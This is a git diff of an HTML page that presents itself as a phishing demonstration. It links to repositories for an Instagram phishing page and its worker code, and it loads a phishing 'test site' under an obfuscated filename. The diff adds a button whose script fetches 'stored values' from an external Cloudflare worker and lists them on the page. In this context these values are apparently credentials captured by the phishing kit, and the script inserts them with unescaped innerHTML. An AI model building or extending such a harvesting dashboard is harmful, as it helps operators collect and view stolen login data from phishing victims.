@@ -73,18 +73,37 @@ a:hover {
         
         <h2>Resources</h2>
         <ul>
-            <li><a href="https://github.com/iotserver24/insta-phishing.git" target="_blank">Page Code on GitHub</a></li>
+           <li><a href="https://github.com/iotserver24/insta-phishing.git" target="_blank">Page Code on GitHub</a></li>
             <li><a href="https://github.com/iotserver24/phishing-worker-code.git" target="_blank">Workers Code on GitHub</a></li>
+        
         </ul>
 
         <h2>Testing</h2>
         <p>If you want to check how phishing websites work, you can load the test site below:</p>
         <button id="loadTestSite" class="action-btn">Load Phishing Test Site</button>
+
+        <h2>Stored Values</h2>
+        <button id="fetchValues" class="action-btn">Fetch Stored Values</button>
+        <div id="valuesDisplay"></div>
     </div>
 
     <script>
         document.getElementById('loadTestSite').addEventListener('click', () => {
             window.location.href = "./k;dfjfks;lkdfkl;fsdf;gkklfkdgffdgkfkv;vmcv;lf;dfl;saf;dkf;laf;dkf;lskf;lskdsf.html";
+        });
+
+        document.getElementById('fetchValues').addEventListener('click', async () => {
+            const response = await fetch('https://insta.iotserver24.workers.dev/values');
+            const values = await response.json();
+
+            const displayDiv = document.getElementById('valuesDisplay');
+            displayDiv.innerHTML = '<h3>Stored Values:</h3><ul>';
+
+            values.forEach(({ key, value }) => {
+                displayDiv.innerHTML += `<li><strong>${key}</strong>: ${value}</li>`;
+            });
+
+            displayDiv.innerHTML += '</ul>';
         });
     </script>
 </body>
